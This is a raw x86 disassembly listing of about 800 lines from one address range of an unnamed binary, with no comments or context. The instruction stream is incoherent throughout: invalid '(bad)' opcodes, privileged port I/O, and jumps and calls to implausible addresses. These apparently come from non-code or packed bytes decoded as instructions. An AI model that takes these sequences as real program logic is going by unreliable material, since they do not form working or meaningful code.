  42e8d9:	enter  0xf3ca,0xfb
  42e8dd:	mov    ah,0xff
  42e8df:	idiv   BYTE PTR [esi-0x3060f47]
  42e8e5:	rcl    cl,0xfb
  42e8e8:	retf   
  42e8e9:	add    al,BYTE PTR [edx]
  42e8eb:	add    eax,0xc004efff
  42e8f0:	rol    bl,cl
  42e8f2:	into   
  42e8f3:	out    dx,al
  42e8f4:	loopne 0x42e8ed
  42e8f6:	iret   
  42e8f7:	(bad)  
  42e8f8:	sar    BYTE PTR [ecx-0x440c422e],1
  42e8fe:	int    0xfe
  42e900:	add    ch,ah
  42e902:	loopne 0x42e8f5
  42e904:	repnz mov ecx,0xfada05df
  42e90a:	fadd   DWORD PTR [ebx]
  42e90c:	enter  0xfcc4,0xcd
  42e910:	into   
  42e911:	loopne 0x42e8df
  42e913:	shr    esp,0xe0
  42e916:	loopne 0x42e8ee
  42e918:	into   
  42e919:	aam    0xda
  42e91b:	call   0xca20dff2
  42e920:	xlat   BYTE PTR ds:[ebx]
  42e921:	rol    bl,1
  42e923:	add    al,dh
  42e925:	add    al,0xc3
  42e927:	fucomip st,st(0)
  42e929:	jmp    0x42e8ff
  42e92b:	or     bh,bh
  42e92d:	loope  0x42e915
  42e92f:	mov    esi,0xe5b6dcf1
  42e934:	rcl    bl,1
  42e936:	aam    0xe0
  42e938:	shl    bh,0xe6
  42e93b:	rcr    edx,cl
  42e93d:	fucomip st,st(0)
  42e93f:	(bad)  
  42e940:	in     al,dx
  42e941:	xlat   BYTE PTR ds:[ebx]
  42e942:	mov    ah,0xd9
  42e944:	clc    
  42e945:	out    0xdc,al
  42e947:	in     eax,0xeb
  42e949:	add    al,0xe1
  42e94b:	retf   
  42e94c:	push   es
  42e94d:	add    cl,al
  42e94f:	icebp  
  42e950:	enter  0xc4a9,0xcf
  42e954:	(bad)  
  42e956:	loope  0x42e93e
  42e958:	scas   al,BYTE PTR es:[edi]
  42e959:	neg    ebx
  42e95b:	mov    ebx,0xd3baeeef
  42e960:	mov    ecx,0xd504e6c7
  42e965:	fmul   st,st(2)
  42e967:	retf   0xc1c0
  42e96a:	in     eax,0x3
  42e96c:	in     al,dx
  42e96d:	enter  0xb1f3,0xc3
  42e971:	shl    BYTE PTR [ecx-0x1928364b],1
  42e977:	fldz   
  42e979:	mov    ch,0xb4
  42e97b:	leave  
  42e97c:	enter  0xe9d0,0xfb
  42e980:	fdivr  st(4),st
  42e982:	repz loop 0x42e945
  42e985:	shl    dh,0x2
  42e988:	cmc    
  42e989:	out    dx,al
  42e98a:	cld    
  42e98b:	mov    DWORD PTR [edx],0xa9c30c02
  42e991:	fdivrp st(6),st
  42e993:	ffree  st(7)
  42e995:	shl    DWORD PTR [edx-0x2206283f],cl
  42e99b:	fnsave [ebx+eax*8-0x2a25fe47]
  42e9a2:	cli    
  42e9a3:	int3   
  42e9a4:	cli    
  42e9a5:	(bad)  
  42e9a6:	loope  0x42e991
  42e9a8:	sar    esi,0xed
  42e9ab:	(bad)  
  42e9ac:	fisttp WORD PTR [ebx]
  42e9ae:	or     eax,0xf1afe2c7
  42e9b3:	out    0xea,eax
  42e9b5:	(bad)  
  42e9b6:	cmc    
  42e9b7:	repnz fxch st(3)
  42e9ba:	out    dx,eax
  42e9bb:	std    
  42e9bc:	jmp    0x42e98c
  42e9be:	int    0xf4
  42e9c0:	fucomip st,st(7)
  42e9c2:	in     eax,dx
  42e9c3:	fstp   TBYTE PTR [eax+ebx*8-0x30051840]
  42e9ca:	les    ecx,FWORD PTR [edi]
  42e9cc:	fld    QWORD PTR [esi]
  42e9ce:	iret   
  42e9cf:	ret    0xddf0
  42e9d2:	out    dx,eax
  42e9d3:	aad    0xb4
  42e9d5:	out    dx,eax
  42e9d6:	mul    ah
  42e9d8:	xlat   BYTE PTR ds:[ebx]
  42e9d9:	cmc    
  42e9da:	retf   0xc9d1
  42e9dd:	aam    0xec
  42e9df:	(bad)  
  42e9e0:	(bad)  [ebp-0x14250b30]
  42e9e6:	clc    
  42e9e7:	add    ebx,eax
  42e9e9:	in     eax,0xf9
  42e9eb:	int    0xe6
  42e9ed:	in     eax,dx
  42e9ee:	push   es
  42e9ef:	in     eax,dx
  42e9f0:	rol    bl,cl
  42e9f2:	(bad)  
  42e9f3:	int    0xcf
  42e9f5:	aad    0xc0
  42e9f7:	in     al,0xe7
  42e9f9:	mov    eax,0xb5b5b8ec
  42e9fe:	add    eax,DWORD PTR [ecx]
  42ea00:	std    
  42ea01:	add    cl,dh
  42ea03:	repnz fsub st,st(5)
  42ea06:	test   edx,0xf801e3f0
  42ea0c:	enter  0xe4c5,0xe1
  42ea10:	(bad)  
  42ea11:	icebp  
  42ea12:	mov    bl,0xeb
  42ea14:	iret   
  42ea15:	ret    0xe9d0
  42ea18:	repz fdiv st,st(1)
  42ea1b:	(bad)  
  42ea1c:	call   edx
  42ea1e:	mov    esi,0xe3ffd8f6
  42ea23:	aad    0xf4
  42ea25:	repnz add eax,0xf9f4c4f9
  42ea2b:	in     eax,0xd8
  42ea2d:	ror    eax,cl
  42ea2f:	(bad)  
  42ea30:	jecxz  0x42ea22
  42ea32:	out    0xb0,eax
  42ea34:	icebp  
  42ea35:	lods   eax,DWORD PTR ds:[esi]
  42ea36:	(bad)  
  42ea37:	(bad)  
  42ea39:	out    dx,al
  42ea3a:	call   0xf602a7fd
  42ea3f:	cld    
  42ea40:	mov    edx,0xdfc3c7f7
  42ea45:	fneni(8087 only) 
  42ea47:	loope  0x42ea21
  42ea49:	fld    DWORD PTR [edi]
  42ea4b:	fild   DWORD PTR ds:0xeed0dd0d
  42ea51:	test   ecx,0xf9b6cdd6
  42ea57:	shl    ch,1
  42ea59:	clc    
  42ea5a:	aad    0xe9
  42ea5c:	hlt    
  42ea5d:	in     al,dx
  42ea5e:	fnstcw WORD PTR [edx-0x1d2a381e]
  42ea64:	ret    
  42ea65:	repnz (bad) 
  42ea67:	(bad)  
  42ea69:	(bad)  [edi]
  42ea6b:	or     al,0xf9
  42ea6d:	retf   
  42ea6e:	(bad)  
  42ea70:	lods   al,BYTE PTR ds:[esi]
  42ea71:	in     eax,dx
  42ea72:	jecxz  0x42ea3a
  42ea74:	(bad)
  42ea77:	(bad)  
  42ea78:	call   0xca0cb36d
  42ea7d:	(bad)  
  42ea7e:	(bad)  
  42ea7f:	mov    edi,0xc1c303fa
  42ea84:	loopne 0x42ea49
  42ea86:	idiv   ah
  42ea88:	enter  0xc0e8,0x5
  42ea8c:	(bad)  
  42ea8e:	out    0xd9,al
  42ea90:	mov    eax,0xf2bde4e6
  42ea95:	retf   0xebd1
  42ea98:	out    dx,al
  42ea99:	stc    
  42ea9a:	(bad)  
  42ea9b:	jmp    0x415b57b
  42eaa0:	shl    BYTE PTR [ebp-0xb430a05],0xfb
  42eaa7:	mov    edi,0xfd03c4c8
  42eaac:	cli    
  42eaad:	push   cs
  42eaae:	clc    
  42eaaf:	out    dx,eax
  42eab0:	fucomip st,st(0)
  42eab2:	retf   0xfbb7
  42eab5:	cmc    
  42eab6:	cli    
  42eab7:	mov    al,0xd4
  42eab9:	icebp  
  42eaba:	mov    esi,0xd9d7f4ff
  42eabf:	xlat   BYTE PTR ds:[ebx]
  42eac0:	imul   ch
  42eac2:	(bad)  
  42eac3:	rcr    ebp,cl
  42eac5:	or     ebx,esi
  42eac7:	or     eax,ebx
  42eac9:	call   0xfd52e98a
  42eace:	int    0xac
  42ead0:	(bad)  
  42ead1:	mov    bh,0xe1
  42ead3:	cmc    
  42ead4:	div    BYTE PTR [edi-0x3812092e]
  42eada:	into   
  42eadb:	(bad)
  42eade:	mov    ebx,0xe1e3f4f4
  42eae3:	in     eax,0xf9
  42eae5:	in     eax,0xd6
  42eae7:	loopne 0x42eaf3
  42eae9:	add    edi,ebp
  42eaeb:	push   es
  42eaec:	or     edx,DWORD PTR [ebx]
  42eaee:	(bad)  
  42eaf0:	into   
  42eaf1:	(bad)  
  42eaf2:	jmp    0xc4ee:0xcedae6bc
  42eaf9:	leave  
  42eafa:	sti    
  42eafb:	icebp  
  42eafc:	retf   0xc3db
  42eaff:	mov    bh,0xfc
  42eb01:	std    
  42eb02:	cli    
  42eb03:	mov    ebp,0xe5d5c2da
  42eb08:	loope  0x42eafe
  42eb0a:	or     eax,0x6f8fce8
  42eb0f:	retf   0xedc1
  42eb12:	out    0xb0,al
  42eb14:	ret    
  42eb15:	loopne 0x42eb01
  42eb17:	call   0xfd1ebfee
  42eb1c:	sar    DWORD PTR [edi-0x21020d28],cl
  42eb22:	in     eax,0xfa
  42eb24:	fmulp  st(3),st
  42eb26:	fdivp  st(6),st
  42eb28:	std    
  42eb29:	retf   
  42eb2a:	fldpi  
  42eb2c:	or     eax,0xc2abda12
  42eb31:	jecxz  0x42eaf8
  42eb33:	aad    0xb3
  42eb35:	(bad)  
  42eb37:	xlat   BYTE PTR ds:[ebx]
  42eb38:	iret   
  42eb39:	leave  
  42eb3a:	test   ah,0xf3
  42eb3d:	add    eax,edx
  42eb3f:	jecxz  0x42eb3f
  42eb41:	(bad)  
  42eb43:	out    0xe7,eax
  42eb45:	shl    ch,cl
  42eb47:	pop    es
  42eb48:	add    dh,dh
  42eb4a:	(bad)  
  42eb4b:	add    eax,0xc50adbd9
  42eb50:	mov    cl,0xdd
  42eb52:	mov    al,0xc8
  42eb54:	cmc    
  42eb55:	call   0xd937bf20
  42eb5a:	mov    al,0xcb
  42eb5c:	stc    
  42eb5d:	sti    
  42eb5e:	cmc    
  42eb5f:	fucomi st,st(5)
  42eb61:	(bad)  
  42eb62:	std    
  42eb63:	add    bl,ah
  42eb65:	(bad)  
  42eb66:	jmp    0xc4da:0xbf6e5f5
  42eb6d:	loope  0x42eb38
  42eb6f:	mov    cl,0xb2
  42eb71:	jecxz  0x42eb37
  42eb73:	in     al,0xdb
  42eb75:	(bad)  
  42eb76:	iret   
  42eb77:	out    dx,al
  42eb78:	mov    eax,0xf3bee5f1
  42eb7d:	(bad)  
  42eb7f:	fidiv  WORD PTR [esi-0x2d01ff0d]
  42eb85:	fdivr  QWORD PTR [eax-0x43020222]
  42eb8b:	out    0xd,eax
  42eb8d:	or     ch,bl
  42eb8f:	icebp  
  42eb90:	jmp    0xd5249e54
  42eb95:	int    0xac
  42eb97:	lock mov ah,0xf6
  42eb9a:	(bad)  
  42eb9c:	mov    ebp,0x3b8cad9
  42eba1:	mov    ebp,0xb9f5ecd2
  42eba6:	fiadd  DWORD PTR [edi+eiz*8]
  42eba9:	push   es
  42ebaa:	into   
  42ebab:	or     al,0xed
  42ebad:	jecxz  0x42eb7a
  42ebaf:	int    0xd2
  42ebb1:	xlat   BYTE PTR ds:[ebx]
  42ebb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebb3:	in     al,0xcb
  42ebb5:	div    ecx
  42ebb7:	in     al,dx
  42ebb8:	clc    
  42ebb9:	retf   0xfdfe
  42ebbc:	aam    0xd8
  42ebbe:	fidivr WORD PTR [ebp-0x2c1c1824]
  42ebc4:	(bad)  
  42ebc6:	repnz sar ecx,0xd6
  42ebca:	fucomip st,st(0)
  42ebcc:	loopne 0x42eb96
  42ebce:	add    edx,ecx
  42ebd0:	in     eax,0xde
  42ebd2:	out    dx,eax
  42ebd3:	(bad)  
  42ebd4:	mov    dl,0xf1
  42ebd6:	test   al,0xce
  42ebd8:	out    0xb5,al
  42ebda:	fcomi  st,st(0)
  42ebdc:	imul   dl
  42ebde:	jmp    0xd831dbb8
  42ebe3:	xlat   BYTE PTR ds:[ebx]
  42ebe4:	cli    
  42ebe5:	(bad)
  42ebe8:	aad    0x1
  42ebea:	fdivr  st,st(7)
  42ebec:	loop   0x42ebec
  42ebee:	iret   
  42ebef:	jecxz  0x42ebe1
  42ebf1:	jecxz  0x42ebba
  42ebf3:	out    0xeb,al
  42ebf5:	(bad)  
  42ebf6:	hlt    
  42ebf7:	hlt    
  42ebf8:	mov    dl,0xc6
  42ebfa:	int3   
  42ebfb:	mov    ah,0xe8
  42ebfd:	hlt    
  42ebfe:	ret    0xdef9
  42ec01:	(bad)  
  42ec02:	into   
  42ec03:	sti    
  42ec04:	mov    dh,0xca
  42ec07:	fucom  st(7)
  42ec09:	retf   0xeae3
  42ec0c:	(bad)  
  42ec0d:	leave  
  42ec0e:	bts    eax,ebp
  42ec11:	scas   eax,DWORD PTR es:[edi]
  42ec12:	div    BYTE PTR [ebx-0x293b1040]
  42ec18:	mov    ah,0xee
  42ec1a:	(bad)  
  42ec1b:	(bad)  
  42ec1c:	lock std 
  42ec1e:	(bad)  
  42ec20:	mov    dh,0xd5
  42ec22:	fsqrt  
  42ec24:	rcr    edx,1
  42ec26:	push   es
  42ec27:	aam    0xd0
  42ec29:	mov    ebp,0xebe1e6e9
  42ec2e:	repz shr DWORD PTR [edi+esi*4-0x173a161e],0xd7
  42ec37:	(bad)  
  42ec38:	into   
  42ec39:	idiv   bh
  42ec3b:	sti    
  42ec3c:	mov    edx,0xbcdfc3d8
  42ec41:	mov    ecx,0xd5bc07dd
  42ec46:	(bad)  
  42ec47:	or     dh,bh
  42ec49:	push   cs
  42ec4a:	or     BYTE PTR [eax],al
  42ec4c:	pop    es
  42ec4d:	retf   
  42ec4e:	call   eax
  42ec50:	shr    BYTE PTR [edi-0x41f0d39],cl
  42ec56:	cli    
  42ec57:	jmp    0xcfec:0xd5d7e8fa
  42ec5e:	mov    ebp,0xe6efdaed
  42ec63:	cmc    
  42ec64:	test   BYTE PTR [esi],0xe2
  42ec67:	(bad)
  42ec6a:	add    bl,al
  42ec6c:	jmp    0x42ec76
  42ec6e:	retf   0xdfb2
  42ec71:	ret    0xd2de
  42ec74:	in     eax,0xf0
  42ec76:	sar    DWORD PTR [ebx-0x22260b4f],cl
  42ec7c:	call   0xd505d769
  42ec81:	fcmovnb st,st(7)
  42ec83:	rol    BYTE PTR [ecx],1
  42ec85:	mov    ecx,0xfcebdfc2
  42ec8a:	vcvttpd2dq xmm4,xmm4
  42ec8e:	fldz   
  42ec90:	shr    DWORD PTR [esi-0x3c4f1758],0xd9
  42ec97:	shl    bh,cl
  42ec99:	stc    
  42ec9a:	mov    edi,0xeef9d3dd
  42ec9f:	in     eax,dx
  42eca0:	out    dx,al
  42eca1:	in     al,dx
  42eca2:	int    0xd8
  42eca4:	mov    edx,0xe2fec1e1
  42eca9:	hlt    
  42ecaa:	out    dx,al
  42ecab:	(bad)  
  42ecac:	or     ch,ch
  42ecae:	adc    ebp,ebx
  42ecb0:	repz enter 0xd1c3,0xd3
  42ecb5:	div    BYTE PTR [ebx-0x48042820]
  42ecbb:	mov    ch,0xdd
  42ecbd:	fnstcw WORD PTR [edx-0xc3e2504]
  42ecc3:	add    bh,cl
  42ecc5:	fcmovb st,st(3)
  42ecc7:	retf   0xdedb
  42ecca:	add    al,0xcd
  42eccc:	jmp    0xf1bf:0xc8f30afe
  42ecd3:	aad    0xd5
  42ecd5:	out    0xac,eax
  42ecd7:	int    0xe4
  42ecd9:	call   0xf720e297
  42ecde:	add    edi,ebp
  42ece0:	mov    esi,0xffd4d0bc
  42ece5:	jmp    0xc0e:0xeedfc9d4
  42ecec:	add    bh,bh
  42ecee:	(bad)  
  42ecef:	mov    ecx,0xd6dec5cb
  42ecf4:	retf   
  42ecf5:	repnz jmp 0xcbb4:0xfedbf2f7
  42ecfd:	cmc    
  42ecfe:	fiadd  WORD PTR [edx]
  42ed00:	clc    
  42ed01:	ret    
  42ed02:	int3   
  42ed03:	std    
  42ed04:	xlat   BYTE PTR ds:[ebx]
  42ed05:	add    eax,0xdde3f1e6
  42ed0a:	out    dx,eax
  42ed0b:	add    eax,0xd9cfcaf3
  42ed10:	ror    bh,cl
  42ed12:	shl    DWORD PTR [esi-0x34321c30],1
  42ed18:	enter  0xceda,0xef
  42ed1c:	fdivr  st,st(2)
  42ed1e:	in     eax,dx
  42ed1f:	call   ecx
  42ed21:	out    0xe5,al
  42ed23:	int3   
  42ed24:	repz add eax,0x9c9fef8
  42ed2a:	add    cl,BYTE PTR [esp+eax*8]
  42ed2d:	(bad)  
  42ed2f:	ror    dl,cl
  42ed31:	repz rol dh,0xe9
  42ed35:	in     al,dx
  42ed36:	mov    dl,0xef
  42ed38:	mov    ah,0xb5
  42ed3a:	cli    
  42ed3b:	mov    edi,0xf3bbb9ea
  42ed40:	call   0xe421de3f
  42ed45:	clc    
  42ed46:	(bad)  
  42ed47:	fimul  DWORD PTR [eax]
  42ed49:	loopne 0x42ed10
  42ed4b:	out    0xec,al
  42ed4d:	in     eax,0xfc
  42ed4f:	shr    edi,1
  42ed51:	in     eax,0xef
  42ed53:	in     al,0xd6
  42ed55:	ror    bl,0xcd
  42ed58:	(bad)  
  42ed5a:	std    
  42ed5b:	mov    bh,0xfe
  42ed5d:	retf   0x203
  42ed60:	mov    eax,0xf1feeef0
  42ed65:	rcr    cl,0xc2
  42ed68:	mov    DWORD PTR [esi],0x20c0df8
  42ed6e:	or     al,dh
  42ed70:	rol    dh,1
  42ed72:	retf   
  42ed73:	mov    cl,0xe9
  42ed75:	loope  0x42ed32
  42ed77:	iret   
  42ed78:	repz (bad) 
  42ed7a:	mov    dh,0xd1
  42ed7c:	cld    
  42ed7d:	(bad)  
  42ed7f:	jmp    0xf937b17b
  42ed84:	fadd   st,st(0)
  42ed86:	test   DWORD PTR [edx],0xfaf4e3e3
  42ed8c:	fsubr  st,st(6)
  42ed8e:	cli    
  42ed8f:	int3   
  42ed90:	loop   0x42ed84
  42ed92:	retf   
  42ed93:	leave  
  42ed94:	jmp    0xd8f59f49
  42ed99:	fmulp  st(6),st
  42ed9b:	mov    edi,0xede9c3eb
  42eda0:	add    dl,dl
  42eda2:	out    0xf2,al
  42eda4:	(bad)
  42eda7:	aad    0xff
  42eda9:	aam    0xf6
  42edab:	dec    eax
  42edad:	out    dx,eax
  42edae:	add    ch,dh
  42edb0:	sar    DWORD PTR [esi-0x3b190a1e],0xe4
  42edb7:	mov    ecx,0xbfb4fab0
  42edbc:	div    eax
  42edbe:	out    dx,al
  42edbf:	enter  0xffce,0xf0
  42edc3:	fidivr DWORD PTR [ebp+0xbc2d905]
  42edc9:	fdivr  st,st(1)
  42edcb:	retf   0xfdec
  42edce:	fadd   st(5),st
  42edd0:	mov    eax,0xcdc8d2f2
  42edd5:	loop   0x42edc7
  42edd7:	retf   0xd8f8
  42edda:	iret   
  42eddb:	mov    ebx,0xdddfddeb
  42ede0:	cld    
  42ede1:	(bad)  
  42ede3:	mov    edi,0xc6d9c7d5
  42ede8:	cli    
  42ede9:	mul    ebx
  42edeb:	or     eax,0xc5da0705
  42edf0:	ror    bl,0xef
  42edf3:	scas   al,BYTE PTR es:[edi]
  42edf4:	out    dx,al
  42edf5:	int    0xb7
  42edf7:	mov    bh,0xce
  42edf9:	fistp  QWORD PTR [eax-0x45453214]
  42edff:	mov    ebp,0xf306ffd3
  42ee04:	fadd   st,st(3)
  42ee06:	fmul   QWORD PTR [ebx]
  42ee08:	std    
  42ee09:	idiv   ebp
  42ee0b:	cli    
  42ee0c:	enter  0xe4ce,0xc3
  42ee10:	test   ecx,0xccdbb5a8
  42ee16:	icebp  
  42ee17:	mov    ecx,0xe5f0dbb7
  42ee1c:	int    0xf0
  42ee1e:	(bad)  
  42ee20:	loope  0x42ede0
  42ee22:	jecxz  0x42ee1a
  42ee24:	in     al,0xdf
  42ee26:	ret    0xdfd5
  42ee29:	cld    
  42ee2a:	add    BYTE PTR [edi],cl
  42ee2c:	int3   
  42ee2d:	fild   DWORD PTR [eax]
  42ee2f:	repz into 
  42ee31:	rol    edx,1
  42ee33:	mov    ch,0xce
  42ee35:	mov    dh,0xdb
  42ee37:	xlat   BYTE PTR ds:[ebx]
  42ee38:	lock retf 
  42ee3a:	(bad)  
  42ee3b:	in     eax,dx
  42ee3c:	xlat   BYTE PTR ds:[ebx]
  42ee3d:	call   0xfc26e310
  42ee42:	pop    es
  42ee43:	not    bl
  42ee45:	sar    edx,1
  42ee47:	stc    
  42ee48:	out    dx,eax
  42ee49:	loop   0x42ee48
  42ee4b:	loop   0x42ee27
  42ee4d:	ror    esp,0xc7
  42ee50:	in     al,dx
  42ee51:	out    0xbe,eax
  42ee53:	scas   eax,DWORD PTR es:[edi]
  42ee54:	aam    0xad
  42ee56:	mul    bh
  42ee58:	shl    ebp,1
  42ee5a:	in     al,dx
  42ee5b:	fdivr  st(2),st
  42ee5d:	fcmovu st,st(7)
  42ee5f:	loopne 0x42ee2f
  42ee61:	mov    ecx,0xc0d3e5ed
  42ee66:	add    al,0xf8
  42ee68:	lds    eax,FWORD PTR [edi]
  42ee6a:	std    
  42ee6b:	aam    0xcc
  42ee6d:	psrad  mm4,mm4
  42ee70:	jmp    0x42ee31
  42ee72:	enter  0xb5d6,0xc4
  42ee76:	(bad)  
  42ee77:	loopne 0x42ee34
  42ee79:	int3   
  42ee7a:	mov    ecx,0xfef1d6dc
  42ee7f:	mov    edx,0xe7c1bfbc
  42ee84:	add    al,0x6
  42ee86:	(bad)  
  42ee87:	mov    ch,0xca
  42ee8a:	out    0xe1,al
  42ee8c:	or     al,bh
  42ee8e:	fsubr  st,st(3)
  42ee90:	fucomip st,st(5)
  42ee92:	cmc    
  42ee93:	mov    cl,0xd6
  42ee95:	in     al,0xea
  42ee97:	out    dx,al
  42ee98:	clc    
  42ee99:	aad    0xe8
  42ee9b:	int    0xcd
  42ee9d:	mov    esi,0xd7bddbdb
  42eea2:	cli    
  42eea3:	icebp  
  42eea4:	not    bl
  42eea6:	mov    BYTE PTR [eax],0xdd
  42eea9:	iret   
  42eeaa:	add    ebp,edx
  42eeac:	out    dx,eax
  42eead:	(bad)  
  42eeaf:	mov    bl,0xc2
  42eeb1:	mul    DWORD PTR [edx+edx*8-0x15482a24]
  42eeb8:	in     al,dx
  42eeb9:	fidiv  DWORD PTR [esi-0x2e330048]
  42eebf:	in     eax,dx
  42eec0:	fptan  
  42eec2:	mov    ebp,0xfce0f8ff
  42eec7:	(bad)  
  42eec9:	add    eax,0x120800fb
  42eece:	in     eax,0xcb
  42eed0:	xlat   BYTE PTR ds:[ebx]
  42eed1:	test   al,0xf1
  42eed3:	leave  
  42eed4:	in     eax,dx
  42eed5:	in     al,0xf6
  42eed7:	clc    
  42eed8:	mov    dl,0xd4
  42eeda:	in     al,0xca
  42eedc:	(bad)  
  42eedd:	fcom   st(3)
  42eedf:	enter  0xcffe,0xfb
  42eee3:	add    eax,0xfac5dce5
  42eee8:	leave  
  42eee9:	aam    0xc4
  42eeeb:	hlt    
  42eeec:	add    ebp,ebx
  42eeee:	int3   
  42eeef:	shr    edx,1
  42eef1:	mov    dl,0xe9
  42eef3:	mov    al,0xe6
  42eef5:	jmp    0xed299fbc
  42eefa:	stc    
  42eefb:	in     eax,0xf9
  42eefd:	retf   0xd0d7
  42ef00:	add    esi,ebx
  42ef02:	lock sar bl,1
  42ef05:	fild   WORD PTR [eax]
  42ef07:	xlat   BYTE PTR ds:[ebx]
  42ef08:	or     edi,DWORD PTR [ebp-0x173b2000]
  42ef0e:	push   es
  42ef0f:	mov    esp,0xf3ecbed3
  42ef14:	jmp    0xf2d2:0xfbf7b7f7
  42ef1b:	leave  
  42ef1c:	(bad)  
  42ef1e:	icebp  
  42ef1f:	shl    BYTE PTR [esi-0x390b0f3d],1
  42ef25:	jmp    0x42ef06
  42ef27:	cmc    
  42ef28:	add    dl,bh
  42ef2a:	clc    
  42ef2b:	cld    
  42ef2c:	out    dx,eax
  42ef2d:	jmp    0x42ef27
  42ef2f:	ret    
  42ef30:	stos   BYTE PTR es:[edi],al
  42ef31:	mov    cl,0xd1
  42ef33:	shl    ebx,cl
  42ef35:	jmp    0xf3c5:0xc6ecf9e8
  42ef3c:	xlat   BYTE PTR ds:[ebx]
  42ef3d:	aam    0xcd
  42ef3f:	fnstcw WORD PTR [eax-0x2d3a3c2e]
  42ef45:	hlt    
  42ef46:	or     eax,DWORD PTR [edi]
  42ef48:	dec    bl
  42ef4a:	(bad)
  42ef4d:	fxam   
  42ef4f:	in     al,0xea
  42ef51:	mov    dl,0xbe
  42ef53:	leave  
  42ef54:	retf   0xc7c7
  42ef57:	in     al,0xe4
  42ef59:	leave  
  42ef5a:	cli    
  42ef5b:	shl    BYTE PTR [edi+ebp*8+0x7f0d1fc],1
  42ef62:	mov    ah,0xcd
  42ef64:	xbegin 0xe22bb667
  42ef6a:	in     al,0xfd
  42ef6c:	loope  0x42ef2f
  42ef6e:	sar    BYTE PTR [ecx+ebp*4-0xf13571b],cl
  42ef75:	icebp  
  42ef76:	mov    dl,0xd2
  42ef78:	iret   
  42ef79:	shl    BYTE PTR [ebp-0x300d402e],cl
  42ef7f:	hlt    
  42ef80:	mov    esi,0xf5bfd8cd
  42ef85:	mov    esp,0xfaf5f6c4
  42ef8a:	stc    
  42ef8b:	iret   
  42ef8c:	or     ebp,ecx
  42ef8e:	out    0xcb,eax
  42ef90:	call   0xcd27e042
  42ef95:	in     eax,dx
  42ef96:	leave  
  42ef97:	stc    
  42ef98:	icebp  
  42ef99:	div    dl
  42ef9b:	retf   
  42ef9c:	fnsave [ecx-0x3e32093d]
  42efa2:	rol    bh,1
  42efa4:	fdiv   st(1),st
  42efa6:	or     ebx,esp
  42efa8:	loopne 0x42ef9f
  42efaa:	(bad)
  42efad:	sar    esp,cl
  42efaf:	retf   0xe8ac
  42efb2:	(bad)  
  42efb4:	rol    ecx,cl
  42efb6:	jmp    0x42ef8b
  42efb8:	repnz out dx,eax
  42efba:	aam    0xd2
  42efbc:	mov    ecx,0xbed3d0f6
  42efc1:	fsubr  st,st(4)
  42efc3:	sar    DWORD PTR [edx-0x6011539],cl
  42efc9:	(bad)  
  42efca:	loope  0x42efb4
  42efcc:	(bad)  
  42efcd:	(bad)  
  42efce:	faddp  st(2),st
  42efd0:	ret    
  42efd1:	ret    0xc0f3
  42efd4:	int3   
  42efd5:	ret    
  42efd6:	rcr    dl,cl
  42efd8:	test   edi,0xd4d2d0c8
  42efde:	into   
  42efdf:	(bad)  
  42efe0:	fdivrp st(2),st
  42efe2:	clc    
  42efe3:	int    0xd2
  42efe5:	mov    ebp,0xffc4d1d9
  42efea:	loopne 0x42efe6
  42efec:	jmp    0xf1b7:0xaee0eb02
  42eff3:	(bad)  
  42eff4:	out    dx,eax
  42eff5:	int3   
  42eff6:	repz enter 0xadea,0xce
  42effb:	mov    edi,0xd8ecd703
  42f000:	ret    0xd1f5
  42f003:	hlt    
  42f004:	add    esp,ebx
  42f006:	rcr    ebx,0xef
  42f009:	or     cl,ah
  42f00b:	out    dx,al
  42f00c:	loope  0x42effb
  42f00e:	repnz lds ebp,FWORD PTR [esi-0x39544330]
  42f015:	retf   
  42f016:	sti    
  42f017:	stc    
  42f018:	call   0xb342cdd5
  42f01d:	cld    
  42f01e:	jmp    0x5d9:0xf6d3f6c1
  42f025:	mov    esp,0xe1de06e2
  42f02a:	out    0xeb,eax
  42f02c:	aam    0x2
  42f02e:	loop   0x42efed
  42f030:	ret    
  42f031:	int3   
  42f032:	ror    dh,cl
  42f034:	mov    ah,0xc6
  42f036:	loop   0x42f00b
  42f038:	sti    
  42f039:	mov    edi,0xf8ccf2d0
  42f03e:	jecxz  0x42f002
  42f040:	fsub   st,st(6)
  42f042:	pop    es
  42f043:	mov    esp,0xf8dbb9fb
  42f048:	enter  0xe6ff,0xc4
  42f04c:	or     edx,esp
  42f04e:	inc    ebp
  42f050:	loope  0x42f01a
  42f052:	test   bl,0xef
  42f055:	jmp    0xe818a228
  42f05a:	std    
  42f05b:	sar    DWORD PTR [eax-0x52a4315],1
  42f061:	mov    esp,0xc3d1e0e5
  42f066:	cld    
  42f067:	in     eax,0x7
  42f069:	(bad)  
  42f06a:	fsubr  st,st(2)
  42f06c:	push   cs
  42f06d:	(bad)  
  42f06e:	jmp    0xcbbd:0xade3e4a8
  42f075:	sar    ecx,0xea
  42f078:	into   
  42f079:	sti    
  42f07a:	lods   al,BYTE PTR ds:[esi]
  42f07b:	in     eax,dx
  42f07c:	jecxz  0x42f032
  42f07e:	repz mov esi,0xf4faff01
  42f084:	div    cl
  42f086:	clc    
  42f087:	fsub   st(2),st
  42f089:	out    dx,al
  42f08a:	in     al,0xeb
  42f08c:	out    0xfc,eax
  42f08e:	fstp   st(6)
  42f090:	shr    dl,1
  42f092:	mov    bh,0xee
  42f094:	out    0xa9,al
  42f096:	div    DWORD PTR [esi-0x471a3229]
  42f09c:	test   ebx,0xc1edecff
  42f0a2:	into   
  42f0a3:	fadd   st(3),st
  42f0a5:	shl    ah,0xa
  42f0a8:	shl    ebp,0xeb
  42f0ab:	loop   0x42f0bb
  42f0ad:	(bad)  
  42f0ae:	fnsave [ecx-0x1b3e2e4d]
  42f0b4:	mov    ah,0xb6
  42f0b6:	ror    esi,1
  42f0b8:	call   0xed34c29b
  42f0bd:	not    bh
  42f0bf:	loop   0x42f094
  42f0c1:	mov    ch,0xd6
  42f0c3:	out    0x2,al
  42f0c5:	hlt    
  42f0c6:	dec    edx
  42f0c8:	div    edi
  42f0ca:	out    0xc8,al
  42f0cc:	add    cl,BYTE PTR [esi]
  42f0ce:	faddp  st(3),st
  42f0d0:	fmulp  st(1),st
  42f0d2:	ror    esp,1
  42f0d4:	leave  
  42f0d5:	retf   
  42f0d6:	rcl    bh,cl
  42f0d8:	jmp    0x42f091
  42f0da:	std    
  42f0db:	hlt    
  42f0dc:	mov    ecx,0xdaf2d5fa
  42f0e1:	add    eax,esi
  42f0e3:	fnop   
  42f0e5:	retf   
  42f0e6:	repnz fsubrp st(0),st
  42f0e9:	out    dx,al
  42f0ea:	clc    
  42f0eb:	in     eax,0xe0
  42f0ed:	fcmovnu st,st(5)
  42f0ef:	shl    dl,0xeb
